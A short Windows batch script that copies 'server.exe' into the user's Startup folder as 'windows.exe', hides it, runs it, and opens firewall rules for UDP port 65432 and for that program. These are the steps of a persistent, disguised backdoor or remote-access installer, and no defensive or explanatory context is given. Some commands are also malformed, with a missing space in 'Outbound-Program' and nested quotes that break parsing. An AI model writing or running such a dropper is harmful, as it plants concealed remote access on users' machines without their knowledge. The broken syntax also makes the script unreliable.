@echo off
set sourceFilePath="server.exe"
set destFolder="C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup"
set newFileName="windows.exe"

:: Copy the file to the destination folder
copy %sourceFilePath% %destFolder%\%newFileName%

:: Make the file hidden
attrib +h "%destFolder%\%newFileName%"

:: Open the file
start "" "%destFolder%\%newFileName%"

powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName "Server" -Direction Inbound -LocalPort 65432 -Protocol UDP -Action Allow"
powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName "Server" -Direction Outbound -LocalPort 65432 -Protocol UDP -Action Allow"

powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName "Server" -Direction Inbound -Program "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\windows.exe" -Protocol UDP -Action Allow"
powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName "Server" -Direction Outbound-Program "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\windows.exe" -Protocol UDP -Action Allow"